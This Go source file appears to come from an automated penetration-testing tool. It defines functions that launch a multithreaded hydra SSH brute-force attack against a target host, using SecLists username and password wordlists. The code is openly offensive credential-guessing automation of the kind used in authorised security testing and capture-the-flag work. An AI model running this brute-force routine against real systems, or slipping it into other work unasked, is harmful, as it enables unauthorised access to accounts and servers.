package main

import (
	"fmt"

	str "strings"
)

func (t *targetT) testSsh(port int, portInfo portInfoT) {
	print("testing %s on port %d...\n", portInfo.service, port)
	t.wg.Add(1)
	go t.sshBrute(port)
}

func (t *targetT) sshBrute(port int) {
	var c cmdT
	c.name = "ssh_brute_fast"
	c.bin = "hydra"

	argsS := fmt.Sprintf("-L %s -P %s -u -f ssh://%s:%d -t 32",
		"/usr/share/seclists/Usernames/top-usernames-shortlist.txt",
		"/usr/share/seclists/Passwords/xato-net-10-million-passwords-100.txt",
		t.host, port)
	c.args = str.Split(argsS, " ")

	runCmd(t.host, &c)
	t.wg.Done()
}
